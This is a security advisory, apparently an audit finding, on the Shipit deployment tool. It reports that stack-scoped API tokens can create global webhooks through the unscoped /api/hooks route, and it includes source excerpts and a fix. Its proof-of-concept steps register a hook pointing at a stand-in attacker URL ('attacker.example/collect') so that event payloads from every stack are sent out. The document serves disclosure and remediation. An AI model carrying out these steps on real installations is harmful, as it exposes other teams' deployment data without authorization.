### Title
Stack-scoped API tokens can create/read/manage global webhooks that fan out events for every stack — ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Shipit::ApiClient` supports scoping a token to a single stack via `belongs_to :stack, optional: true` / `stack_id?` [1](#0-0) , and `Api::BaseController#stacks` enforces that binding for every stack-oriented read/write endpoint by restricting the queryable `Stack` collection to `current_api_client.stack_id` when set [2](#0-1) . `Api::HooksController`, however, never consults `current_api_client.stack_id` at all — it derives its scope purely from whether the URL happens to include a `stack_id` segment [3](#0-2) . Hitting the top-level, unscoped `/api/hooks` route (also mounted alongside the stack-nested one) with the same token makes `stack_id` resolve to `nil`, and `Hook.where(stack_id: nil)` selects/creates **global** hooks, which `Hook.deliver`/`for_stack` fan out to every stack in the installation [4](#0-3) [5](#0-4) .

### Finding Description
The equality this binding is supposed to preserve is:

`stack the ApiClient token is authorized for == stack whose data the token's requests can touch`

`Api::BaseController` enforces this for `Stack`, `Task`, `Deploy`, `Rollback`, `MergeRequest`, etc., through the `stacks`/`stack` helpers, which intersect the requested stack with `current_api_client.stack_id` [2](#0-1) . `Api::HooksController#hooks` bypasses this entirely:

```ruby
def hooks
  Hook.where(stack_id:)
end

def stack_id
  stack.id if params[:stack_id].present?
end
``` [3](#0-2) 

`stack_id` is `nil` whenever the request is made against the non-nested `resources :hooks` route (`namespace :api do ... resources :hooks, only: %i[index create show update destroy] end`) rather than the stack-nested one (`scope '/stacks/*stack_id', ... resources :hooks ...`) [5](#0-4) . When `stack_id` is `nil`, `hooks` resolves to `Hook.where(stack_id: nil)` — the set of **global** hooks — with no check against `current_api_client.stack_id`. A token created with a non-empty `stack_id` (intended to scope it to a single stack, matching the semantics used everywhere else, e.g. `here_come_the_walrus` fixture: `stack: shipit`) can still authenticate against the unscoped route and, given only `write:hook`/`read:hook` permission, list, create, update, or destroy global hooks. Global hooks are delivered for every stack's `deploy`, `rollback`, `task`, `merge`, `lock`, `commit_status`, `pull_request`, etc. events (`Hook.deliver` selects `for_stack(stack_id)` which is `where(stack_id: [nil, stack_id])`) [6](#0-5) .

### Impact Explanation
A holder of an API token that is only supposed to authorize actions for one stack (`ApiClient.stack_id` set) can plant a global `delivery_url` that will receive event payloads (deploy status, task output links, rollback, merge, commit status) for *every stack managed by the Shipit installation*, not just the stack the token was scoped to. This is a cross-repository/cross-stack data exposure that breaks the `stack a token authorizes` vs `stack it touches` binding, achieved purely with an unprivileged, narrowly-scoped API token and no additional credentials, session, or GitHub App key.

### Likelihood Explanation
Any legitimate, narrowly-scoped API client with `write:hook`/`read:hook` permission (a routine permission grant for CI integrations, per `ApiClient::PERMISSIONS`) is by design not expected to have visibility beyond its own stack [7](#0-6) . Since the enforcement gap is purely structural (URL-route based, not credential based) and requires only calling the alternate, always-mounted `/api/hooks` endpoint with the same Basic-Auth token, this is trivially reachable by anyone already holding such a token.

### Recommendation
In `Api::HooksController`, scope `hooks` using the same invariant as `Api::BaseController#stacks`/`#stack` — e.g. reject or ignore requests to the unscoped route when `current_api_client.stack_id?` is true, or always intersect `hooks` with `current_api_client.stack_id` when present, mirroring the pattern already used for stacks.

### Proof of Concept
1. Create/obtain an `ApiClient` with `stack_id` set to stack `A` and permissions `['read:hook','write:hook']` (the intended use case: a per-stack integration token).
2. Authenticate with that token's Basic-Auth credentials against the top-level route `POST /api/hooks` (not `/api/stacks/:stack_id/hooks`) with `{ delivery_url: 'https://attacker.example/collect', events: ['deploy','task','merge'] }`.
3. `Api::HooksController#stack_id` returns `nil` because `params[:stack_id]` is absent, so `hooks.create` persists a `Hook` with `stack_id: nil` — a global hook.
4. From then on, `Hook.deliver` fires this hook for `deploy`, `task`, and `merge` events raised by **every** stack in the Shipit instance, exfiltrating their event payloads to `attacker.example`, even though the token's `ApiClient.stack_id` was `A`.

### Citations

**File:** app/models/shipit/api_client.rb (L7-8)
```ruby
    belongs_to :creator, class_name: 'User'
    belongs_to :stack, optional: true
```

**File:** app/models/shipit/api_client.rb (L13-21)
```ruby
    PERMISSIONS = %w[
      read:stack
      write:stack
      deploy:stack
      lock:stack
      read:hook
      write:hook
    ].freeze
    validates :permissions, subset: { of: PERMISSIONS }
```

**File:** app/controllers/shipit/api/base_controller.rb (L74-80)
```ruby
      def stacks
        @stacks ||= current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all
      end

      def stack
        @stack ||= stacks.from_param!(params[:stack_id])
      end
```

**File:** app/controllers/shipit/api/hooks_controller.rb (L42-52)
```ruby
      def hook
        hooks.find(params[:id])
      end

      def hooks
        Hook.where(stack_id:)
      end

      def stack_id
        stack.id if params[:stack_id].present?
      end
```

**File:** app/models/shipit/hook.rb (L93-119)
```ruby
    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
```

**File:** config/routes.rb (L27-47)
```ruby
    scope '/stacks/*stack_id', stack_id: stack_id_format, as: :stack do
      get '/ccmenu' => 'ccmenu#show', as: :ccmenu
      resource :lock, only: %i[create update destroy]
      resources :tasks, only: %i[index show] do
        resource :output, only: :show
        member do
          put :abort
        end
      end
      resources :deploys, only: %i[index create] do
        resources :release_statuses, only: %i[create]
      end
      resources :rollbacks, only: %i[create]
      resources :commits, only: %i[index]
      resources :merge_requests, only: %i[index show update destroy]
      post '/task/:task_name' => 'tasks#trigger', as: :trigger_task
      resources :hooks, only: %i[index create show update destroy]
    end

    resources :hooks, only: %i[index create show update destroy]
  end
```
